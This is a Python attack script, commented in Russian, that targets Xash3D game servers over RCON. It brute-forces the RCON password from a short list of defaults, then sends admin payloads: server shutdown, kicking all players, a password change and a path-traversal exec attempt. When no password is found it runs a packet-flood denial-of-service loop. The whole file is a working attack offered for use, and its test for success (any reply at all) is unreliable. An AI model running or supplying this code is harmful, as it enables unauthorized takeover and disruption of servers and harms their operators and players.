#!/usr/bin/env python3
"""
Xash3D RCON Command Injection Exploit
Эксплуатирует уязвимость в обработке RCON команд
"""

import socket
import struct
import time
import sys

class XashRCONExploit:
    def __init__(self, target_ip, target_port=27015):
        self.target_ip = target_ip
        self.target_port = target_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(5.0)
    
    def send_connectionless_packet(self, command):
        """Отправляет connectionless пакет серверу"""
        # Connectionless пакеты начинаются с 0xFFFFFFFF
        packet = struct.pack('<I', 0xFFFFFFFF)
        packet += command.encode('utf-8')
        
        try:
            self.sock.sendto(packet, (self.target_ip, self.target_port))
            print(f"[+] Sent: {command}")
            
            # Пытаемся получить ответ
            try:
                response, addr = self.sock.recvfrom(4096)
                if len(response) > 4:
                    print(f"[+] Response: {response[4:].decode('utf-8', errors='ignore')}")
                    return response[4:]
            except socket.timeout:
                print("[-] No response (timeout)")
                return None
                
        except Exception as e:
            print(f"[-] Error: {e}")
            return None
    
    def brute_force_rcon(self, wordlist=None):
        """Брутфорс RCON пароля"""
        if wordlist is None:
            # Стандартные пароли
            wordlist = [
                "", "admin", "password", "123456", "rcon", "server", 
                "xash3d", "halflife", "valve", "steam", "cs", "cstrike",
                "test", "1234", "pass", "root", "user", "game"
            ]
        
        print(f"[*] Brute forcing RCON password on {self.target_ip}:{self.target_port}")
        
        for password in wordlist:
            print(f"[*] Trying password: '{password}'")
            
            # Отправляем RCON команду с тестовым паролем
            rcon_cmd = f"rcon {password} status"
            response = self.send_connectionless_packet(rcon_cmd)
            
            if response and b"Bad rcon_password" not in response:
                print(f"[+] FOUND PASSWORD: '{password}'")
                return password
            
            time.sleep(0.5)  # Задержка между попытками
        
        print("[-] Password not found in wordlist")
        return None
    
    def exploit_command_injection(self, password, payload):
        """Эксплуатация command injection через RCON"""
        print(f"[*] Exploiting command injection with password: {password}")
        
        # Различные векторы атак
        payloads = [
            f"rcon {password} {payload}",
            f"rcon {password} exec ../../../{payload}",
            f"rcon {password} alias exploit \"{payload}\"; exploit",
            f"rcon {password} echo {payload}; {payload}",
        ]
        
        for i, cmd in enumerate(payloads):
            print(f"[*] Trying payload {i+1}: {cmd}")
            response = self.send_connectionless_packet(cmd)
            
            if response:
                print(f"[+] Payload {i+1} executed successfully!")
                return True
            
            time.sleep(1)
        
        return False
    
    def get_server_info(self):
        """Получает информацию о сервере"""
        print(f"[*] Getting server info from {self.target_ip}:{self.target_port}")
        
        # Запрос информации о сервере
        info_response = self.send_connectionless_packet("info")
        
        # Запрос статуса
        status_response = self.send_connectionless_packet("status")
        
        # Запрос правил
        rules_response = self.send_connectionless_packet("rules")
        
        return {
            'info': info_response,
            'status': status_response, 
            'rules': rules_response
        }
    
    def dos_attack(self):
        """DoS атака через спам пакетов"""
        print(f"[*] Starting DoS attack on {self.target_ip}:{self.target_port}")
        
        try:
            for i in range(1000):
                # Спамим различными пакетами
                self.send_connectionless_packet("info" * 100)
                self.send_connectionless_packet("status" * 100)
                self.send_connectionless_packet("rules" * 100)
                self.send_connectionless_packet("rcon " + "A" * 1000)
                
                if i % 100 == 0:
                    print(f"[*] Sent {i} packets...")
                    
        except KeyboardInterrupt:
            print("\n[*] DoS attack stopped")

def main():
    if len(sys.argv) < 2:
        print("Usage: python rcon_exploit.py <target_ip> [target_port]")
        print("Example: python rcon_exploit.py 192.168.1.100 27015")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 27015
    
    exploit = XashRCONExploit(target_ip, target_port)
    
    print("=== Xash3D RCON Exploit ===")
    print(f"Target: {target_ip}:{target_port}")
    print()
    
    # 1. Получаем информацию о сервере
    print("[1] Getting server information...")
    server_info = exploit.get_server_info()
    
    # 2. Брутфорсим RCON пароль
    print("\n[2] Brute forcing RCON password...")
    password = exploit.brute_force_rcon()
    
    if password is not None:
        print(f"\n[3] Exploiting with password: {password}")
        
        # Различные команды для эксплуатации
        payloads = [
            "quit",  # Выключить сервер
            "changelevel de_dust2",  # Сменить карту
            "kick all",  # Кикнуть всех игроков
            "exec autoexec.cfg",  # Выполнить конфиг
            "sv_cheats 1",  # Включить читы
            "rcon_password newpass",  # Сменить пароль
        ]
        
        for payload in payloads:
            print(f"\n[*] Executing: {payload}")
            exploit.exploit_command_injection(password, payload)
            time.sleep(2)
    else:
        print("\n[3] RCON password not found, trying DoS attack...")
        exploit.dos_attack()

if __name__ == "__main__":
    main()
